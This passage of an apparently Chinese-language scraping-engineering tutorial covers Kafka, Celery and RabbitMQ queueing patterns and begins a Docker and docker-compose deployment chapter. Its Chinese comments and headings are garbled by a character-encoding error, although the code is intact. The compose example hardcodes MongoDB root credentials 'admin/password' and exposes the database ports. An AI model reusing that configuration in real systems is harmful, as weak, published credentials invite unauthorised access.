            <span class="n">group_id</span><span class="o">=</span><span class="n">group_id</span><span class="p">,</span>
            <span class="n">value_deserializer</span><span class="o">=</span><span class="k">lambda</span> <span class="n">m</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)),</span>
            <span class="n">auto_offset_reset</span><span class="o">=</span><span class="s1">&#39;earliest&#39;</span><span class="p">,</span>
            <span class="n">enable_auto_commit</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

<span class="c1"># ç”Ÿäº§è€…</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">KafkaClient</span><span class="p">()</span>
<span class="n">producer</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_producer</span><span class="p">()</span>

<span class="c1"># å‘é€æ¶ˆæ¯</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;https://example.com/page/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;index&#39;</span><span class="p">:</span> <span class="n">i</span><span class="p">}</span>
    <span class="n">producer</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;scraper-urls&#39;</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">message</span><span class="p">)</span>

<span class="n">producer</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<span class="n">producer</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># æ¶ˆè´¹è€…</span>
<span class="n">consumer</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_consumer</span><span class="p">(</span><span class="s1">&#39;scraper-urls&#39;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">consumer</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">value</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Processing: </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="celery">Celery</h2>

      <h3 id="å®‰è£…é…ç½®">å®‰è£…é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>celery<span class="o">[</span>redis<span class="o">]</span>
</code></pre>
      </div>

      <h3 id="å®šä¹‰ä»»åŠ¡">å®šä¹‰ä»»åŠ¡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># tasks.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">celery</span><span class="w"> </span><span class="kn">import</span> <span class="n">Celery</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span>
    <span class="s1">&#39;scraper&#39;</span><span class="p">,</span>
    <span class="n">broker</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/0&#39;</span><span class="p">,</span>
    <span class="n">backend</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/1&#39;</span>
<span class="p">)</span>

<span class="n">app</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
    <span class="n">task_serializer</span><span class="o">=</span><span class="s1">&#39;json&#39;</span><span class="p">,</span>
    <span class="n">accept_content</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;json&#39;</span><span class="p">],</span>
    <span class="n">result_serializer</span><span class="o">=</span><span class="s1">&#39;json&#39;</span><span class="p">,</span>
    <span class="n">timezone</span><span class="o">=</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">,</span>
    <span class="n">enable_utc</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
<span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">task</span><span class="p">(</span><span class="n">bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">max_retries</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">scrape_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;çˆ¬å– URL ä»»åŠ¡&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
            <span class="s1">&#39;status_code&#39;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span>
            <span class="s1">&#39;content_length&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
        <span class="c1"># é‡è¯•</span>
        <span class="k">raise</span> <span class="bp">self</span><span class="o">.</span><span class="n">retry</span><span class="p">(</span><span class="n">exc</span><span class="o">=</span><span class="n">exc</span><span class="p">,</span> <span class="n">countdown</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">task</span>
<span class="k">def</span><span class="w"> </span><span class="nf">process_data</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å¤„ç†æ•°æ®ä»»åŠ¡&quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Processing: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="s1">&#39;processed&#39;</span><span class="p">}</span>

<span class="c1"># ä»»åŠ¡é“¾</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">task</span>
<span class="k">def</span><span class="w"> </span><span class="nf">save_to_db</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¿å­˜åˆ°æ•°æ®åº“&quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Saving: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="s1">&#39;saved&#39;</span><span class="p">}</span>
</code></pre>
      </div>

      <h3 id="å¯åŠ¨-worker">å¯åŠ¨ Worker</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¯åŠ¨ Celery Worker</span>
celery<span class="w"> </span>-A<span class="w"> </span>tasks<span class="w"> </span>worker<span class="w"> </span>--loglevel<span class="o">=</span>info

<span class="c1"># å¯åŠ¨å¤šä¸ª Worker</span>
celery<span class="w"> </span>-A<span class="w"> </span>tasks<span class="w"> </span>worker<span class="w"> </span>--concurrency<span class="o">=</span><span class="m">10</span>

<span class="c1"># å¯åŠ¨ Flower (ç›‘æ§å·¥å…·)</span>
celery<span class="w"> </span>-A<span class="w"> </span>tasks<span class="w"> </span>flower
</code></pre>
      </div>

      <h3 id="è°ƒç”¨ä»»åŠ¡">è°ƒç”¨ä»»åŠ¡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">tasks</span><span class="w"> </span><span class="kn">import</span> <span class="n">scrape_url</span><span class="p">,</span> <span class="n">process_data</span><span class="p">,</span> <span class="n">save_to_db</span>

<span class="c1"># å¼‚æ­¥è°ƒç”¨</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">scrape_url</span><span class="o">.</span><span class="n">delay</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>

<span class="c1"># è·å–ç»“æœ</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">))</span>

<span class="c1"># ä»»åŠ¡é“¾</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">celery</span><span class="w"> </span><span class="kn">import</span> <span class="n">chain</span>

<span class="n">workflow</span> <span class="o">=</span> <span class="n">chain</span><span class="p">(</span>
    <span class="n">scrape_url</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">),</span>
    <span class="n">process_data</span><span class="o">.</span><span class="n">s</span><span class="p">(),</span>
    <span class="n">save_to_db</span><span class="o">.</span><span class="n">s</span><span class="p">()</span>
<span class="p">)</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">workflow</span><span class="o">.</span><span class="n">apply_async</span><span class="p">()</span>

<span class="c1"># ä»»åŠ¡ç»„ï¼ˆå¹¶è¡Œï¼‰</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">celery</span><span class="w"> </span><span class="kn">import</span> <span class="n">group</span>

<span class="n">job</span> <span class="o">=</span> <span class="n">group</span><span class="p">([</span>
    <span class="n">scrape_url</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://example.com/page/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="p">])</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">job</span><span class="o">.</span><span class="n">apply_async</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="å®šæ—¶ä»»åŠ¡">å®šæ—¶ä»»åŠ¡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">celery.schedules</span><span class="w"> </span><span class="kn">import</span> <span class="n">crontab</span>

<span class="n">app</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">beat_schedule</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;scrape-every-hour&#39;</span><span class="p">:</span> <span class="p">{</span>
        <span class="s1">&#39;task&#39;</span><span class="p">:</span> <span class="s1">&#39;tasks.scrape_url&#39;</span><span class="p">,</span>
        <span class="s1">&#39;schedule&#39;</span><span class="p">:</span> <span class="n">crontab</span><span class="p">(</span><span class="n">minute</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span>  <span class="c1"># æ¯å°æ—¶æ‰§è¡Œ</span>
        <span class="s1">&#39;args&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,)</span>
    <span class="p">},</span>
    <span class="s1">&#39;cleanup-every-day&#39;</span><span class="p">:</span> <span class="p">{</span>
        <span class="s1">&#39;task&#39;</span><span class="p">:</span> <span class="s1">&#39;tasks.cleanup&#39;</span><span class="p">,</span>
        <span class="s1">&#39;schedule&#39;</span><span class="p">:</span> <span class="n">crontab</span><span class="p">(</span><span class="n">hour</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">minute</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span>  <span class="c1"># æ¯å¤©å‡Œæ™¨</span>
    <span class="p">},</span>
<span class="p">}</span>

<span class="c1"># å¯åŠ¨ Beat</span>
<span class="c1"># celery -A tasks beat --loglevel=info</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="1-æ¶ˆæ¯æŒä¹…åŒ–">1. æ¶ˆæ¯æŒä¹…åŒ–</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># é˜Ÿåˆ—æŒä¹…åŒ–</span>
<span class="n">channel</span><span class="o">.</span><span class="n">queue_declare</span><span class="p">(</span><span class="n">queue</span><span class="o">=</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span> <span class="n">durable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># æ¶ˆæ¯æŒä¹…åŒ–</span>
<span class="n">channel</span><span class="o">.</span><span class="n">basic_publish</span><span class="p">(</span>
    <span class="n">exchange</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
    <span class="n">routing_key</span><span class="o">=</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span>
    <span class="n">body</span><span class="o">=</span><span class="n">message</span><span class="p">,</span>
    <span class="n">properties</span><span class="o">=</span><span class="n">pika</span><span class="o">.</span><span class="n">BasicProperties</span><span class="p">(</span><span class="n">delivery_mode</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="2-æ¶ˆæ¯ç¡®è®¤">2. æ¶ˆæ¯ç¡®è®¤</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ‰‹åŠ¨ç¡®è®¤</span>
<span class="n">channel</span><span class="o">.</span><span class="n">basic_consume</span><span class="p">(</span>
    <span class="n">queue</span><span class="o">=</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span>
    <span class="n">on_message_callback</span><span class="o">=</span><span class="n">callback</span><span class="p">,</span>
    <span class="n">auto_ack</span><span class="o">=</span><span class="kc">False</span>  <span class="c1"># ç¦ç”¨è‡ªåŠ¨ç¡®è®¤</span>
<span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">callback</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">properties</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
    <span class="c1"># å¤„ç†æ¶ˆæ¯</span>
    <span class="n">process</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
    <span class="c1"># ç¡®è®¤</span>
    <span class="n">ch</span><span class="o">.</span><span class="n">basic_ack</span><span class="p">(</span><span class="n">delivery_tag</span><span class="o">=</span><span class="n">method</span><span class="o">.</span><span class="n">delivery_tag</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="3-é™æµæ§åˆ¶">3. é™æµæ§åˆ¶</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># é¢„å–æ•°é‡é™åˆ¶</span>
<span class="n">channel</span><span class="o">.</span><span class="n">basic_qos</span><span class="p">(</span><span class="n">prefetch_count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="4-æ­»ä¿¡é˜Ÿåˆ—">4. æ­»ä¿¡é˜Ÿåˆ—</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å£°æ˜æ­»ä¿¡é˜Ÿåˆ—</span>
<span class="n">channel</span><span class="o">.</span><span class="n">queue_declare</span><span class="p">(</span><span class="n">queue</span><span class="o">=</span><span class="s1">&#39;dead_letter_queue&#39;</span><span class="p">,</span> <span class="n">durable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># é…ç½®ä¸»é˜Ÿåˆ—</span>
<span class="n">channel</span><span class="o">.</span><span class="n">queue_declare</span><span class="p">(</span>
    <span class="n">queue</span><span class="o">=</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span>
    <span class="n">durable</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
    <span class="n">arguments</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;x-dead-letter-exchange&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
        <span class="s1">&#39;x-dead-letter-routing-key&#39;</span><span class="p">:</span> <span class="s1">&#39;dead_letter_queue&#39;</span><span class="p">,</span>
        <span class="s1">&#39;x-message-ttl&#39;</span><span class="p">:</span> <span class="mi">60000</span>  <span class="c1"># 60ç§’åè¿‡æœŸ</span>
    <span class="p">}</span>
<span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
        <li><a href="#06-Engineering-docker-deployment">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-docker-deployment">
      <h2>55. Docker Deployment</h2>
      <h1 id="docker-å®¹å™¨åŒ–éƒ¨ç½²">Docker å®¹å™¨åŒ–éƒ¨ç½²</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Docker å®¹å™¨åŒ–ä½¿çˆ¬è™«é¡¹ç›®å…·å¤‡å¯ç§»æ¤æ€§ã€å¯æ‰©å±•æ€§å’Œæ˜“ç»´æŠ¤æ€§ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•å°†çˆ¬è™«é¡¹ç›®å®¹å™¨åŒ–å¹¶è¿›è¡Œç”Ÿäº§éƒ¨ç½²ã€‚</p>

      <hr />

      <h2 id="docker-åŸºç¡€">Docker åŸºç¡€</h2>

      <h3 id="æ ¸å¿ƒæ¦‚å¿µ">æ ¸å¿ƒæ¦‚å¿µ</h3>

      <ul>
        <li><strong>é•œåƒ (Image)</strong>: åªè¯»æ¨¡æ¿ï¼ŒåŒ…å«è¿è¡Œåº”ç”¨æ‰€éœ€çš„ä¸€åˆ‡</li>
        <li><strong>å®¹å™¨ (Container)</strong>: é•œåƒçš„è¿è¡Œå®ä¾‹</li>
        <li><strong>Dockerfile</strong>: æ„å»ºé•œåƒçš„è„šæœ¬</li>
        <li><strong>Docker Compose</strong>: å¤šå®¹å™¨ç¼–æ’å·¥å…·</li>
      </ul>

      <hr />

      <h2 id="dockerfile-ç¼–å†™">Dockerfile ç¼–å†™</h2>

      <h3 id="çˆ¬è™«é¡¹ç›®-dockerfile">çˆ¬è™«é¡¹ç›® Dockerfile</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># ä½¿ç”¨å®˜æ–¹ Python é•œåƒ</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>

<span class="c"># è®¾ç½®å·¥ä½œç›®å½•</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># å®‰è£…ç³»ç»Ÿä¾èµ–</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>gcc<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>g++<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>wget<span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="c"># å¤åˆ¶ä¾èµ–æ–‡ä»¶</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.

<span class="c"># å®‰è£… Python ä¾èµ–</span>
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c"># å¤åˆ¶é¡¹ç›®ä»£ç </span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="c"># æš´éœ²ç«¯å£ï¼ˆå¦‚æœæœ‰ APIï¼‰</span>
<span class="k">EXPOSE</span><span class="w"> </span><span class="s">8000</span>

<span class="c"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="k">ENV</span><span class="w"> </span><span class="nv">PYTHONUNBUFFERED</span><span class="o">=</span><span class="m">1</span>

<span class="c"># è¿è¡Œçˆ¬è™«</span>
<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;main.py&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="puppeteerplaywright-dockerfile">Puppeteer/Playwright Dockerfile</h3>

      <p>éœ€è¦å®‰è£…æµè§ˆå™¨ä¾èµ–ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">node:18-slim</span>

<span class="c"># å®‰è£… Chromium ä¾èµ–</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>chromium<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>fonts-liberation<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libappindicator3-1<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libasound2<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libatk-bridge2.0-0<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libatk1.0-0<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libcups2<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libdbus-1-3<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libgdk-pixbuf2.0-0<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libnspr4<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libnss3<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libx11-xcb1<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libxcomposite1<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libxdamage1<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>libxrandr2<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>xdg-utils<span class="w"> </span><span class="se">\</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="k">COPY</span><span class="w"> </span>package*.json<span class="w"> </span>./
<span class="k">RUN</span><span class="w"> </span>npm<span class="w"> </span>install

<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;node&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;index.js&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <hr />

      <h2 id="docker-compose">Docker Compose</h2>

      <h3 id="å®Œæ•´çˆ¬è™«ç³»ç»Ÿç¼–æ’">å®Œæ•´çˆ¬è™«ç³»ç»Ÿç¼–æ’</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.8&#39;</span>

<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># Redis</span>
<span class="w">  </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;6379:6379&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis_data:/data</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>

<span class="w">  </span><span class="c1"># MongoDB</span>
<span class="w">  </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:6</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;27017:27017&quot;</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">password</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo_data:/data/db</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>

<span class="w">  </span><span class="c1"># çˆ¬è™« Master</span>
<span class="w">  </span><span class="nt">spider-master</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python master.py</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_URL=redis://redis:6379</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MONGO_URL=mongodb://admin:password@mongodb:27017</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>

<span class="w">  </span><span class="c1"># çˆ¬è™« Worker</span>
<span class="w">  </span><span class="nt">spider-worker</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python worker.py</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">REDIS_URL=redis://redis:6379</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MONGO_URL=mongodb://admin:password@mongodb:27017</span>
<span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unless-stopped</span>
<span class="w">    </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">replicas</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3</span><span class="w">  </span><span class="c1"># å¯åŠ¨3ä¸ªWorker</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">redis_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mongo_data</span><span class="p">:</span>
</code></pre>
      </div>

      <h3 id="å¯åŠ¨å’Œç®¡ç†">å¯åŠ¨å’Œç®¡ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ„å»ºé•œåƒ</span>
docker-compose<span class="w"> </span>build

<span class="c1"># å¯åŠ¨æ‰€æœ‰æœåŠ¡</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d

<span class="c1"># æŸ¥çœ‹æ—¥å¿—</span>
docker-compose<span class="w"> </span>logs<span class="w"> </span>-f<span class="w"> </span>spider-worker

<span class="c1"># æ‰©å±• Worker æ•°é‡</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span>--scale<span class="w"> </span>spider-worker<span class="o">=</span><span class="m">5</span>

<span class="c1"># åœæ­¢æ‰€æœ‰æœåŠ¡</span>
docker-compose<span class="w"> </span>down

<span class="c1"># åœæ­¢å¹¶åˆ é™¤å·</span>
docker-compose<span class="w"> </span>down<span class="w"> </span>-v
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="1-å¤šé˜¶æ®µæ„å»º">1. å¤šé˜¶æ®µæ„å»º</h3>

      <p>å‡å°é•œåƒä½“ç§¯ï¼š</p>

